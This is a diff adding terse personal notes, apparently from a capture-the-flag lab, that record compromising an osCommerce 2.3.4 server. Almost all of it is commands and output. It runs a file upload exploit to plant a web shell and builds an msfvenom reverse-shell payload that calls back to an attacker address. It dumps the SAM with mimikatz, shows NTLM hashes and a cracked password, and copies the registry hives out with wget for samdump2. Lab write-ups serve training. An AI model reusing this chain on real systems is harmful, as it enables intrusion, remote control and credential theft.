@@ -1,0 +1,116 @@
+web:8080
+
+
+
+					recon
+
+Oscommerce 2.3 
+
+*can install
+
+http://10.10.211.251:8080/oscommerce-2.3.4/catalog/install/
+
+Database Server:localhost
+User:root
+Database Name:oscommerce
+
+
+*can make admin creds lol
+
+
+					exploitation
+
+
+
+$ searchsploit oscommerce 2.3.4
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+osCommerce 2.3.4 - Multiple Vulnerabilities                                        | php/webapps/34582.txt
+osCommerce 2.3.4.1 - 'currency' SQL Injection                                      | php/webapps/46328.txt
+osCommerce 2.3.4.1 - 'products_id' SQL Injection                                   | php/webapps/46329.txt
+osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                    | php/webapps/46330.txt
+osCommerce 2.3.4.1 - Arbitrary File Upload                                         | php/webapps/43191.py
+osCommerce 2.3.4.1 - Remote Code Execution                                         | php/webapps/44374.py
+----------------------------------------------------------------------------------- ---------------------------------
+
+
+
+(test upload)
+
+$ python 43191.py -u http://10.10.121.155:8080/oscommerce-2.3.4 --auth=admin:admin -f shell.php
+[+] Authentication successful
+[+] Successfully prepared the exploit and created a new newsletter with nID 1
+[+] Successfully locked the newsletter. Now attempting to upload..
+[*] Now trying to verify that the file shell.php uploaded..
+[+] Got a HTTP 200 Reply for the uploaded file!
+[+] The uploaded file should now be available at http://10.10.121.155:8080/oscommerce-2.3.4/catalog/admin/shell.php
+
+
+
+
+(payload upload)
+
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.2.26.235 LPORT=4444 -f exe > shell.exe
+
+
+
+
+(execute exe)
+http://10.10.121.155:8080/oscommerce-2.3.4/catalog/admin/shell.php?cmd=shell.exe
+
+
+(need to get hashes)
+(x86 architecture, need x86 mimikatz)
+
+
+
+
+mimikatz # lsadump::sam
+Domain : BLUEPRINT
+SysKey : 147a48de4a9815d2aa479598592b086f
+Local SID : S-1-5-21-3130159037-241736515-3168549210
+
+SAMKey : 3700ddba8f7165462130a4441ef47500
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   : 
+NTLM : 549a1bcb88e35dc18c7a0b0168631411
+
+RID  : 000001f5 (501)
+User : Guest
+LM   : 
+NTLM : 
+
+RID  : 000003e8 (1000)
+User : Lab
+LM   : 
+NTLM : 30e87bf999828446a1c1209ddde4c450
+
+
+
+NTLM:googleplus
+
+
+
+
+
+					shits & gigs
+
+(on target)
+reg save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin\sam
+reg save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\catalog\admin\system
+
+(on attack)
+sudo wget 10.10.211.251:8080/oscommerce-2.3.4/catalog/admin/sam
+sudo wget 10.10.211.251:8080/oscommerce-2.3.4/catalog/admin/system
+
+
+$ samdump2 system sam
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
+
+
